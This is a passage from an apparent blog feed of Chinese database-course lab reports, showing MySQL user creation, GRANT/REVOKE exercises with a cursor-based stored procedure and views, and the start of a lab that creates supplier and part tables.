FROM@QUERY;<br>EXECUTE statement;<br>DEALLOCATE PREPARE statement;<br>FETCH cur INTO v_user,v_host; -- 取下一个用户<br>END WHILE;<br><br>CLOSE cur;<br><br>END $$<br><br>CALL grant_select_职工视图_to_pubic ();  -- 调用过程，授权给所有用户:<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402154216161-166545617908623.png" alt="image-20220402154216161"></p></li><li><p>在创建存储过程后，还可以创建一个触发器，使在”职工”表中有新职工的记录时，再使用<code>GRANT</code>进行授权（默认该职工的地址为’%’）。（注意，触发器无法定义于对系统表的操作）</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">DELIMITER $$<br>CREATE TRIGGER grant_select_职工视图 AFTER INSERT ON 职工<br>BEGIN<br>GRANT SELECT ON `职工视图` TO CONCAT(NEW.姓名,&#x27;@%&#x27;) <br>END<br>DELIMITER ; -- 把定界符改回‘;’<br></code></pre></div></td></tr></table></figure></li><li><p>听说这个地方易出问题，故做个<strong>测试</strong>：</p><p>“职工”表如下：</p><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402211401588-166545617908724.png" alt="image-20220402211401588"></p><p>在”李勇”表查看视图”职工视图”：</p><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402211519668-166545617908725.png" alt="image-20220402211519668"></p><p>可以得到，李勇只能查看自己的记录：</p><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402211701809-166545617908726.png" alt="image-20220402211701809"></p></li></ul><h4 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h4><p>用户刘星对职工表有SELECT权限，对工资字段具有更新权限。</p><ul><li><p>先创建用户</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">CREATE USER 刘星;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402160351729-166545617908728.png" alt="image-20220402160351729"></p></li><li><p>再授予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">GRANT SELECT,UPDATE(工资) ON TABLE 职工 TO 刘星;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402160409622-166545617908727.png" alt="image-20220402160409622"></p></li></ul><h4 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h4><p>用户张新具有修改这两个表的结构的权限。</p><ul><li><p>先创建用户</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">CREATE USER 张新;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402160817955-166545617908729.png" alt="image-20220402160817955"></p></li><li><p>再授予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">GRANT ALTER ON TABLE 职工 TO 张新;<br>GRANT ALTER ON TABLE 部门 TO 张新;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402161019804-166545617908730.png" alt="image-20220402161019804"></p></li></ul><h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><p>用户周平具有对两个表的所有权限（读、插、改、删数据），并具有给其他用户授权的权限。</p><ul><li><p>先创建用户</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">CREATE USER 周平;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402161223063-166545617908731.png" alt></p></li><li><p>再授予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs MYSQL">GRANT ALL PRIVILEGES ON TABLE 职工 TO 周平 WITH GRANT OPTION;<br>GRANT ALL PRIVILEGES ON TABLE 部门 TO 周平 WITH GRANT OPTION;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402161238445-166545617908732.png" alt="image-20220402161238445"></p></li></ul><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><p>用户杨兰具有从每个部门职工中SELECT最高工资、最低工资、平均工资的权限，他不能查看每个人的工资。</p><ul><li><p>创建用户</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">CREATE USER 杨兰;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402161433925-166545617908733.png" alt="image-20220402161433925"></p></li><li><p>创建含每个部门职工最高工资、最低工资、平均工资的视图</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">CREATE VIEW 部门工资 AS<br>SELECT 部门.名称,MAX(工资),MIN(工资),AVG(工资)<br>FROM 部门,职工<br>WHERE 部门.部门号=职工.部门号<br>GROUP BY 职工.部门号;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402162134126-166545617908735.png" alt="image-20220402162134126"></p></li><li><p>给杨兰授予SELECT该视图的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">GRANT SELECT ON 部门工资 TO 杨兰;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402162338611-166545617908734.png" alt="image-20220402162338611"></p></li></ul><h3 id="第8题"><a href="#第8题" class="headerlink" title="第8题"></a>第8题</h3><p>针对习题7中（1）～（7）的每一种情况，撤销个用户所授予的权限。</p><h4 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h4><p>撤销用户王明对两个表的SELECT权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">REVOKE SELECT ON TABLE 职工 FROM 王明;<br>REVOKE SELECT ON TABLE 部门 FROM 王明;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402162547599-166545617908736.png" alt="image-20220402162547599"></p><h4 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h4><p>撤销用户李勇对两个表的INSERT和DELETE权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">REVOKE INSERT,DELETE ON TABLE 职工 FROM 李勇;<br>REVOKE INSERT,DELETE ON TABLE 部门 FROM 李勇;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402162752828-166545617908737.png" alt="image-20220402162752828"></p><h4 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h4><p>撤销每个职工对自己的记录的SELECT权限。</p><p>同样使用存储过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">delimiter $$<br>CREATE PROCEDURE revoke_select_职工视图_from_pubic () <br>BEGIN<br>DECLARE v_user CHAR ( 32 ); -- 定义变量，用于储存用户名：<br>DECLARE v_host CHAR ( 32 ); -- 定义变量，用于储存地址：<br>DECLARE done INT DEFAULT FALSE; -- 定义结束标志<br>DECLARE cur CURSOR FOR SELECT user,host FROM mysql.USER;  -- 定义游标（用户名及其地址）<br>DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;  -- 定义 NOT FOUND类异常的HANDLER：<br><br>OPEN cur; -- 打开游标<br>FETCH cur INTO v_user,v_host; -- 取游标的一行数据到变量，并推进游标<br><br>-- 每取一个user，构造一条授权语句，然后执行这条语句<br>-- 因为grant语句不接受变量，所以只能构造整条语句<br>WHILE NOT done DO<br><br>SET @QUERY = CONCAT( &#x27;GRANT SELECT ON 职工视图 TO \&#x27;&#x27;, v_user,&#x27;\&#x27;@\&#x27;&#x27;,v_host,&#x27;\&#x27;&#x27;); -- 授权语句<br>PREPARE statement FROM@QUERY;<br>EXECUTE statement;<br>-- 先授权,再撤权,防止因有些用户没有该权限而报错<br>SET @QUERY = CONCAT( &#x27;REVOKE SELECT ON 职工视图 FROM \&#x27;&#x27;, v_user,&#x27;\&#x27;@\&#x27;&#x27;,v_host,&#x27;\&#x27;&#x27;); -- 撤权语句<br>PREPARE statement FROM@QUERY;<br>EXECUTE statement;<br>DEALLOCATE PREPARE statement;<br>FETCH cur INTO v_user,v_host; -- 取下一个用户<br>END WHILE;<br><br>CLOSE cur;<br><br>END $$<br><br>CALL revoke_select_职工视图_from_pubic () ;  -- 调用过程，撤销所有用户的该权限<br></code></pre></div></td></tr></table></figure><h4 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h4><p>撤销用户刘星对职工表的SELECT权限，对工资字段的更新权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">REVOKE SELECT,UPDATE(工资) ON TABLE 职工 FROM 刘星;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402164013361-166545617908738.png" alt="image-20220402164013361"></p><h4 id="5-2"><a href="#5-2" class="headerlink" title="5"></a>5</h4><p>撤销用户张新修改这两个表的结构的权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">REVOKE ALTER ON TABLE 职工 FROM 张新;<br>REVOKE ALTER ON TABLE 部门 FROM 张新;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402164141766-166545617908739.png" alt="image-20220402164141766"></p><h4 id="6-1"><a href="#6-1" class="headerlink" title="6"></a>6</h4><p>撤销用户周平对两个表的所有权限（读、插、改、删数据）。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">REVOKE ALL PRIVILEGES ON TABLE 职工 FROM 周平;<br>REVOKE ALL PRIVILEGES ON TABLE 部门 FROM 周平;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402164434305-166545617908741.png" alt="image-20220402164434305"></p><h4 id="7-1"><a href="#7-1" class="headerlink" title="7"></a>7</h4><p>撤销用户杨兰具有从每个部门职工中SELECT最高工资、最低工资、平均工资的权限，即撤销用户杨兰查看视图”部门工资“的权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs MYSQL">REVOKE SELECT ON 部门工资 FROM 杨兰;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402164605029-166545617908740.png" alt="image-20220402164605029"></p><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><p>在这次实验中，我总结了以下注意点，从而对SQL语句和数据库的安全性控制更加熟练：</p><ul><li><p>建表时有个细节：对于有外键的表，可以先建立该外键对应主键的表，然后在建具有外键的表时同时使用<code>FOREIGN ... REFERENCES ...</code>语句。或者在建完两张表后再使用<code>ALTER</code>给表添加外键。</p></li><li><p>MySQL的<code>Grant</code>操作不能同时对两张表使用。（6.1、7.1、7.5等）</p></li><li><p>对于MySQL，授予权限时，即<code>GRANT</code>后所跟的是某些权限，只能使用<code>WITH GRANT OPTION</code>使权限可传递。而授予角色时，若要用户可继续授权，需要使用<code>WITH ADMIN OPTION</code>。在MySQL中，权限授予的传播是关联的。需要再加注意的是，只有通过<code>SET DEFAULT ROLE R1 TO &#39;U1&#39;</code>激活，U1才会拥有角色R1的权限。（6.1、6.5）</p></li><li><p>由于MySQL没有PUBLIC关键字。故对所有用户进行相同的操作时，可以构建一个存储过程（PROCEDURE），用游标遍历用户名以及地址，达到批量处理的目的，在有许多用户名时能够提升效率。（6.3、7.3）</p></li><li>若改变某一个表，或其中的某行后，想要对数据库做固定的操作，可以使用触发器来实现。需要注意的是，MySQL的触发器不支持动态SQL语句。（7.3）</li><li>视图可以提供一个统一访问数据的接口，即可以允许用户通过视图访问数据的安全机制，而不授予用户直接访问底层表的权限。当用户关心一部分数据时，可以考虑创建一个视图进行查看数据。（7.3、7.7）</li><li><p><code>Group by</code>根据一个或多个列对结果集进行分组，从而能使用MAX、MIN、AVG等函数对该组数据进行处理。（7.7）</p></li><li><p><code>REVOKE</code>只能撤销已存在的权限。</p></li></ul><h2 id="部分参考链接"><a href="#部分参考链接" class="headerlink" title="部分参考链接"></a>部分参考链接</h2><p><a href="https://www.cnblogs.com/weiqt/articles/5416742.html">with admin option 和 with grant option 的区别 (转)</a></p><p><a href="https://www.cnblogs.com/whiteY/p/14214906.html">mysql用户及权限（WITH GRANT OPTION）</a></p><p><a href="https://www.zhihu.com/question/385952022">mysql数据库如何将某一个表的查询权限授予给所有用户？</a></p>]]></content>
    
    
    <categories>
      
      <category>数据库系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《数据库系统概论》课程之实验二：交互式SQL</title>
    <link href="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/"/>
    <url>/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/</url>
    
    <content type="html"><![CDATA[<h1 id="《数据库系统概论》课程之实验二：交互式SQL"><a href="#《数据库系统概论》课程之实验二：交互式SQL" class="headerlink" title="《数据库系统概论》课程之实验二：交互式SQL"></a>《数据库系统概论》课程之实验二：交互式SQL</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>1．熟悉数据库的交互式SQL工具。</p><p>2．熟悉通过SQL对数据库进行操作。</p><p>3．完成作业的上机练习。</p><h2 id="实验工具-MySQL"><a href="#实验工具-MySQL" class="headerlink" title="实验工具 MySQL"></a>实验工具 MySQL</h2><p>利用MySQL及其图形化界面工具Navicat来熟悉SQL。</p><h2 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h2><h3 id="1-建立数据库"><a href="#1-建立数据库" class="headerlink" title="1. 建立数据库"></a>1. 建立数据库</h3><p>在MySQL中建立一个数据库，进行实验所要求的各种操作，所有的SQL操作均在此建立的新库里进行。</p><p> <img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/Users\yuhan\AppData\Roaming\Typora\typora-user-images\image-20220416175415036.png" alt="image-20220416175415036"></p><h3 id="第4题"><a href="#第4题" class="headerlink" title="第4题"></a>第4题</h3><p>用SQL语句建立第2章习题6中的4个表；针对建立的4个表用SQL语言完成第2章习题6中的查询。</p><h4 id="建表并添加数据"><a href="#建表并添加数据" class="headerlink" title="建表并添加数据"></a>建表并添加数据</h4><p><strong>运行以下SQL语句：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql"># 建立供应商表S<br>CREATE TABLE S <br>(<br>SNO VARCHAR(5) PRIMARY KEY,<br>SNAME VARCHAR(10),<br>STATUS VARCHAR(5),<br>CITY VARCHAR(10)<br>);<br><br># 向表S插入数据<br>INSERT INTO S VALUES(&#x27;S1&#x27;,&#x27;精益&#x27;,&#x27;20&#x27;,&#x27;天津&#x27;);<br>INSERT INTO S VALUES(&#x27;S2&#x27;,&#x27;盛锡&#x27;,&#x27;10&#x27;,&#x27;北京&#x27;);<br>INSERT INTO S VALUES(&#x27;S3&#x27;,&#x27;东方红&#x27;,&#x27;30&#x27;,&#x27;北京&#x27;);<br>INSERT INTO S VALUES(&#x27;S4&#x27;,&#x27;丰泰盛&#x27;,&#x27;20&#x27;,&#x27;天津&#x27;);<br>INSERT INTO S VALUES(&#x27;S5&#x27;,&#x27;为民&#x27;,&#x27;30&#x27;,&#x27;上海&#x27;);<br><br># 建立零件表P<br>CREATE TABLE P<br>(<br>PNO VARCHAR(5) PRIMARY KEY,<br>PNAME VARCHAR(10),<br>COLOR VARCHAR(5),<br>WEIGHT INT<br>);<br><br># 向表P插入数据<br>INSERT INTO P VALUES(&#x27;P1&#x27;,&#x27;螺母&#x27;,&#x27;红&#x27;,12);<br>INSERT INTO P VALUES(&#x27;P2&#x27;,&#x27;螺栓&#x27;,&#x27;绿&#x27;,17);<br>INSERT INTO P VALUES(&#x27;P3&#x27;,&#x27;螺丝刀&#x27;,&#x27;蓝&#x27;,14);<br>INSERT INTO P 